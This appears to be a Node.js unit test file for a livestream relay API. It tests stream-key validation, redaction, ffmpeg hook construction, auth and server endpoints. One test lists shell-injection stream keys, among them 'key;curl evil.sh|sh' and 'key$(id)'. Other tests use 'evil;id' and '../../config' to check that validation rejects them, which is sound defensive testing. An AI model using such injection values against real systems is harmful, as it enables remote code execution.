/**
 * Unit tests for the LIVETAP relay session API.
 * Run with:  node --test infra/relay/session-api/
 *
 * No vitest here on purpose: infra/ must be runnable with a bare Node 20 and
 * no workspace install.
 */

import test from 'node:test';
import assert from 'node:assert/strict';

import {
  validateIngest,
  validateRequest,
  redactIngest,
  composeRtmpPublishUrl,
  buildHookCommand,
  loadConfig,
  isAuthorized,
  newSessionId,
  SESSION_ID_RE,
  createServer,
} from './relay-session.mjs';

const ENV = {
  MTX_PUBLISH_PASSWORD: 'pub-secret',
  MTX_API_PASSWORD: 'api-secret',
  MTX_HOOK_PASSWORD: 'hook-secret',
  LIVETAP_RELAY_PUBLIC_HOST: 'relay.example.com',
};

const cfg = loadConfig(ENV);
const cfgVertical = loadConfig({ ...ENV, LIVETAP_ENABLE_VERTICAL_TRANSCODE: '1' });

// ---------------------------------------------------------------------------
// validateIngest — must match packages/core/src/validation/ingest.ts
// ---------------------------------------------------------------------------

test('validateIngest accepts the shapes core accepts', () => {
  assert.equal(validateIngest({ protocol: 'rtmp', url: 'rtmp://live.twitch.tv/app', streamKey: 'live_123_abc' }).ok, true);
  assert.equal(validateIngest({ protocol: 'rtmps', url: 'rtmps://a.rtmps.youtube.com/live2', streamKey: 'abcd-efgh' }).ok, true);
  assert.equal(validateIngest({ protocol: 'srt', url: 'srt://ingest.example.com:9000?streamid=abc' }).ok, true);
  assert.equal(validateIngest({ protocol: 'whip', url: 'https://relay.example.com/whip/abc' }).ok, true);
});

test('validateIngest rejects the shapes core rejects', () => {
  assert.equal(validateIngest(undefined).ok, false);
  assert.ok(validateIngest({ protocol: 'rtmp', url: '', streamKey: 'x' }).errors.includes('Stream URL is required.'));
  assert.equal(validateIngest({ protocol: 'rtmp', url: 'http://nope', streamKey: 'x' }).ok, false);
  assert.equal(validateIngest({ protocol: 'rtmps', url: 'rtmp://insecure/app', streamKey: 'x' }).ok, false);
  assert.equal(validateIngest({ protocol: 'rtmp', url: 'rtmp://host/app' }).ok, false, 'missing stream key');
  assert.equal(validateIngest({ protocol: 'nope', url: 'rtmp://host/app' }).ok, false);
});

// This is the security test that matters most: MediaMTX runs the hook through
// `sh -c`, so these characters must never survive validation.
test('validateIngest blocks shell metacharacters in stream keys', () => {
  for (const evil of [
    'key;curl evil.sh|sh',
    'key`id`',
    'key$(id)',
    'key with space',
    'key"quote',
    "key'quote",
    'key|pipe',
    'key&background',
    'key<in',
    'key>out',
  ]) {
    const r = validateIngest({ protocol: 'rtmp', url: 'rtmp://host/app', streamKey: evil });
    assert.equal(r.ok, false, `should reject stream key: ${evil}`);
    assert.ok(
      r.errors.some((e) => e.includes('not allowed')),
      `should flag disallowed characters for: ${evil}`,
    );
  }
});

test('validateIngest blocks shell metacharacters in URLs', () => {
  const r = validateIngest({ protocol: 'rtmp', url: 'rtmp://host/app;id', streamKey: 'ok' });
  assert.equal(r.ok, false);
});

// ---------------------------------------------------------------------------
// redaction
// ---------------------------------------------------------------------------

test('redactIngest never exposes a full stream key', () => {
  const r = redactIngest({ protocol: 'rtmp', url: 'rtmp://host/app', streamKey: 'supersecretkey1234' });
  assert.equal(r.streamKey, '••••1234');
  assert.ok(!JSON.stringify(r).includes('supersecretkey'));
});

test('redactIngest tolerates a missing key', () => {
  assert.equal(redactIngest({ protocol: 'srt', url: 'srt://h:9000' }).streamKey, undefined);
});

// ---------------------------------------------------------------------------
// URL composition
// ---------------------------------------------------------------------------

test('composeRtmpPublishUrl joins without a double slash', () => {
  assert.equal(
    composeRtmpPublishUrl({ protocol: 'rtmp', url: 'rtmp://host/app/', streamKey: 'k' }),
    'rtmp://host/app/k',
  );
  assert.equal(
    composeRtmpPublishUrl({ protocol: 'rtmps', url: 'rtmps://host/live2', streamKey: 'k' }),
    'rtmps://host/live2/k',
  );
  assert.equal(composeRtmpPublishUrl({ protocol: 'srt', url: 'srt://h:9000' }), 'srt://h:9000');
});

// ---------------------------------------------------------------------------
// hook construction
// ---------------------------------------------------------------------------

const twoFlat = [
  { protocol: 'rtmp', url: 'rtmp://127.0.0.1:19351/live', streamKey: 'a', aspectRatio: '16:9' },
  { protocol: 'rtmps', url: 'rtmps://a.rtmp.youtube.com/live2', streamKey: 'yt-key', aspectRatio: '16:9' },
];

test('hook copies video and transcodes audio to AAC', () => {
  const cmd = buildHookCommand('sess1', twoFlat, cfg);
  assert.match(cmd, /-c:v copy/);
  assert.match(cmd, /-c:a aac/);
  assert.ok(!cmd.includes('-c:a copy'), 'audio must never be copied: WHIP delivers Opus, RTMP needs AAC');
});

test('hook fans out to every destination through one tee', () => {
  const cmd = buildHookCommand('sess1', twoFlat, cfg);
  assert.match(cmd, /rtmp:\/\/127\.0\.0\.1:19351\/live\/a/);
  assert.match(cmd, /rtmps:\/\/a\.rtmp\.youtube\.com\/live2\/yt-key/);
  assert.equal((cmd.match(/onfail=ignore/g) || []).length, 2, 'each destination must fail independently');
  assert.equal((cmd.match(/-f tee/g) || []).length, 1, 'one output group for flat destinations');
});

test('hook reads back over loopback RTSP with the hook credential', () => {
  const cmd = buildHookCommand('sess1', twoFlat, cfg);
  assert.match(cmd, /rtsp:\/\/relayhook:hook-secret@127\.0\.0\.1:\$RTSP_PORT\/\$MTX_PATH/);
});

// `onfail=ignore` alone would drop a destination for the rest of the broadcast.
// The fifo options are what actually reconnect it (verified end-to-end: a
// destination was killed and restarted mid-stream and recovered on its own).
test('hook enables per-destination reconnect and backpressure dropping', () => {
  const cmd = buildHookCommand('sess1', twoFlat, cfg);
  assert.match(cmd, /-use_fifo 1/);
  assert.match(cmd, /attempt_recovery=1/);
  assert.match(cmd, /recovery_wait_time=1/);
  assert.match(cmd, /recover_any_error=1/);
  // Mandatory backpressure guard (ADR-005): a stalled destination must drop
  // packets, never stall the ingest.
  assert.match(cmd, /drop_pkts_on_overflow=1/);
});

test('the vertical output group gets the same reconnect treatment', () => {
  const cmd = buildHookCommand('s', [
    { protocol: 'rtmp', url: 'rtmp://tiktok/live', streamKey: 'tk', aspectRatio: '9:16' },
  ], cfgVertical);
  assert.match(cmd, /-use_fifo 1/);
  assert.match(cmd, /drop_pkts_on_overflow=1/);
});

test('hook suppresses non-monotonic DTS from the WebRTC source', () => {
  const cmd = buildHookCommand('sess1', twoFlat, cfg);
  assert.match(cmd, /-fflags \+genpts/);
  assert.match(cmd, /-max_interleave_delta 0/);
});

test('hook adds a second output group only for 9:16 destinations', () => {
  const mixed = [
    ...twoFlat,
    { protocol: 'rtmp', url: 'rtmp://tiktok/live', streamKey: 'tk', aspectRatio: '9:16' },
  ];
  const flatOnly = buildHookCommand('s', twoFlat, cfgVertical);
  assert.ok(!flatOnly.includes('libx264'), 'no re-encode when nothing is vertical');

  const cmd = buildHookCommand('s', mixed, cfgVertical);
  assert.match(cmd, /crop=ih\*9\/16:ih,scale=1080:1920/);
  assert.match(cmd, /-c:v libx264/);
  assert.equal((cmd.match(/-f tee/g) || []).length, 2, 'flat group + vertical group');
  // The vertical destination must not also appear in the copy group.
  const [flatGroup] = cmd.split('-filter:v');
  assert.ok(!flatGroup.includes('rtmp://tiktok/live/tk'));
});

test('a vertical-only session produces no copy group', () => {
  const cmd = buildHookCommand('s', [
    { protocol: 'rtmp', url: 'rtmp://tiktok/live', streamKey: 'tk', aspectRatio: '9:16' },
  ], cfgVertical);
  assert.equal((cmd.match(/-f tee/g) || []).length, 1);
  assert.match(cmd, /-c:v libx264/);
});

// ---------------------------------------------------------------------------
// request validation
// ---------------------------------------------------------------------------

test('validateRequest requires at least one destination', () => {
  assert.equal(validateRequest({}, cfg).ok, false);
  assert.equal(validateRequest({ destinations: [] }, cfg).ok, false);
  assert.equal(validateRequest(null, cfg).ok, false);
});

test('validateRequest caps the destination count', () => {
  const many = Array.from({ length: 11 }, () => twoFlat[0]);
  assert.equal(validateRequest({ destinations: many }, cfg).ok, false);
});

test('validateRequest refuses 9:16 unless the relay enables re-encoding', () => {
  const body = { destinations: [{ protocol: 'rtmp', url: 'rtmp://h/live', streamKey: 'k', aspectRatio: '9:16' }] };
  const off = validateRequest(body, cfg);
  assert.equal(off.ok, false);
  assert.ok(off.errors.some((e) => e.includes('LIVETAP_ENABLE_VERTICAL_TRANSCODE')));
  assert.equal(validateRequest(body, cfgVertical).ok, true);
});

test('validateRequest refuses SRT and WHIP destinations', () => {
  assert.equal(validateRequest({ destinations: [{ protocol: 'srt', url: 'srt://h:9000' }] }, cfg).ok, false);
  assert.equal(validateRequest({ destinations: [{ protocol: 'whip', url: 'https://h/whip' }] }, cfg).ok, false);
});

test('validateRequest rejects an unknown aspect ratio', () => {
  const body = { destinations: [{ protocol: 'rtmp', url: 'rtmp://h/live', streamKey: 'k', aspectRatio: '4:3' }] };
  assert.equal(validateRequest(body, cfg).ok, false);
});

test('validation errors never echo the stream key back', () => {
  const body = { destinations: [{ protocol: 'rtmp', url: 'rtmp://h/live', streamKey: 'bad;key' }] };
  const r = validateRequest(body, cfg);
  assert.equal(r.ok, false);
  assert.ok(!JSON.stringify(r.errors).includes('bad;key'));
});

// ---------------------------------------------------------------------------
// auth
// ---------------------------------------------------------------------------

test('isAuthorized accepts only the exact bearer token', () => {
  assert.equal(isAuthorized({ headers: { authorization: 'Bearer pub-secret' } }, cfg), true);
  assert.equal(isAuthorized({ headers: { authorization: 'Bearer wrong' } }, cfg), false);
  assert.equal(isAuthorized({ headers: { authorization: 'Basic pub-secret' } }, cfg), false);
  assert.equal(isAuthorized({ headers: {} }, cfg), false);
  assert.equal(isAuthorized({ headers: { authorization: 'Bearer ' } }, cfg), false);
});

test('loadConfig demands every secret', () => {
  for (const missing of ['MTX_PUBLISH_PASSWORD', 'MTX_API_PASSWORD', 'MTX_HOOK_PASSWORD', 'LIVETAP_RELAY_PUBLIC_HOST']) {
    const env = { ...ENV };
    delete env[missing];
    assert.throws(() => loadConfig(env), new RegExp(missing));
  }
});

test('session ids are opaque and path-safe', () => {
  for (let i = 0; i < 20; i++) assert.match(newSessionId(), SESSION_ID_RE);
});

// ---------------------------------------------------------------------------
// server behaviour (fake MediaMTX)
// ---------------------------------------------------------------------------

function withServer(t, cfgUsed, mtx, fn) {
  const logs = [];
  const log = { info: (m) => logs.push(m), error: (m) => logs.push(m) };
  const server = createServer(cfgUsed, mtx, log);
  return new Promise((resolve, reject) => {
    server.listen(0, async () => {
      const base = `http://127.0.0.1:${server.address().port}`;
      try {
        await fn(base, logs);
        resolve();
      } catch (e) {
        reject(e);
      } finally {
        server.close();
      }
    });
  });
}

const AUTH = { Authorization: 'Bearer pub-secret', 'Content-Type': 'application/json' };

test('POST /sessions creates a path and returns a WHIP URL', async (t) => {
  const calls = [];
  const mtx = {
    addPath: async (name, conf) => { calls.push({ name, conf }); },
    deletePath: async () => {},
  };
  await withServer(t, cfg, mtx, async (base) => {
    const res = await fetch(`${base}/sessions`, {
      method: 'POST', headers: AUTH, body: JSON.stringify({ destinations: twoFlat }),
    });
    assert.equal(res.status, 201);
    const body = await res.json();
    assert.match(body.sessionId, SESSION_ID_RE);
    assert.equal(body.whipUrl, `http://relay.example.com:18889/live/${body.sessionId}/whip`);
    assert.equal(body.whipAuthorization, 'livetap:pub-secret');

    assert.equal(calls.length, 1);
    assert.equal(calls[0].name, `live/${body.sessionId}`);
    assert.deepEqual(calls[0].conf.forward, [], 'native forward must stay empty');
    assert.match(calls[0].conf.runOnAvailable, /-c:a aac/);
    assert.equal(calls[0].conf.runOnAvailableRestart, true);
  });
});

test('stream keys never reach the logs', async (t) => {
  const mtx = { addPath: async () => {}, deletePath: async () => {} };
  await withServer(t, cfg, mtx, async (base, logs) => {
    await fetch(`${base}/sessions`, {
      method: 'POST', headers: AUTH, body: JSON.stringify({ destinations: twoFlat }),
    });
    const all = logs.join('\n');
    assert.ok(all.length > 0, 'something should have been logged');
    assert.ok(!all.includes('yt-key'), 'YouTube stream key leaked into logs');
    assert.ok(all.includes('••••'), 'log should carry the redacted form');
  });
});

test('unauthenticated requests get 401 and create nothing', async (t) => {
  let called = false;
  const mtx = { addPath: async () => { called = true; }, deletePath: async () => {} };
  await withServer(t, cfg, mtx, async (base) => {
    const res = await fetch(`${base}/sessions`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ destinations: twoFlat }),
    });
    assert.equal(res.status, 401);
    assert.equal(called, false);
  });
});

test('invalid destinations get 400 and create nothing', async (t) => {
  let called = false;
  const mtx = { addPath: async () => { called = true; }, deletePath: async () => {} };
  await withServer(t, cfg, mtx, async (base) => {
    const res = await fetch(`${base}/sessions`, {
      method: 'POST', headers: AUTH,
      body: JSON.stringify({ destinations: [{ protocol: 'rtmp', url: 'rtmp://h/live', streamKey: 'evil;id' }] }),
    });
    assert.equal(res.status, 400);
    assert.equal(called, false);
    const body = await res.json();
    assert.ok(Array.isArray(body.details));
  });
});

test('DELETE /sessions/:id removes the path', async (t) => {
  const deleted = [];
  const mtx = { addPath: async () => {}, deletePath: async (n) => { deleted.push(n); } };
  await withServer(t, cfg, mtx, async (base) => {
    const res = await fetch(`${base}/sessions/abcdef0123456789`, {
      method: 'DELETE', headers: { Authorization: 'Bearer pub-secret' },
    });
    assert.equal(res.status, 204);
    assert.deepEqual(deleted, ['live/abcdef0123456789']);
  });
});

test('DELETE rejects a malformed session id without calling MediaMTX', async (t) => {
  let called = false;
  const mtx = { addPath: async () => {}, deletePath: async () => { called = true; } };
  await withServer(t, cfg, mtx, async (base) => {
    for (const bad of ['../../config', 'short', 'has%20space']) {
      const res = await fetch(`${base}/sessions/${bad}`, {
        method: 'DELETE', headers: { Authorization: 'Bearer pub-secret' },
      });
      assert.ok(res.status === 400 || res.status === 404, `expected rejection for ${bad}, got ${res.status}`);
    }
    assert.equal(called, false);
  });
});

test('DELETE of an unknown session returns 404', async (t) => {
  const mtx = {
    addPath: async () => {},
    deletePath: async () => { const e = new Error('nope'); e.status = 404; throw e; },
  };
  await withServer(t, cfg, mtx, async (base) => {
    const res = await fetch(`${base}/sessions/abcdef0123456789`, {
      method: 'DELETE', headers: { Authorization: 'Bearer pub-secret' },
    });
    assert.equal(res.status, 404);
  });
});

test('a MediaMTX failure becomes a 500 that leaks nothing', async (t) => {
  const mtx = {
    addPath: async () => { throw new Error('MediaMTX API POST /v3/... failed: 500'); },
    deletePath: async () => {},
  };
  await withServer(t, cfg, mtx, async (base) => {
    const res = await fetch(`${base}/sessions`, {
      method: 'POST', headers: AUTH, body: JSON.stringify({ destinations: twoFlat }),
    });
    assert.equal(res.status, 500);
    const body = await res.json();
    assert.equal(body.error, 'Relay error.');
    assert.ok(!JSON.stringify(body).includes('yt-key'));
  });
});

test('GET /healthz needs no auth', async (t) => {
  const mtx = { addPath: async () => {}, deletePath: async () => {} };
  await withServer(t, cfg, mtx, async (base) => {
    const res = await fetch(`${base}/healthz`);
    assert.equal(res.status, 200);
    assert.deepEqual(await res.json(), { ok: true });
  });
});
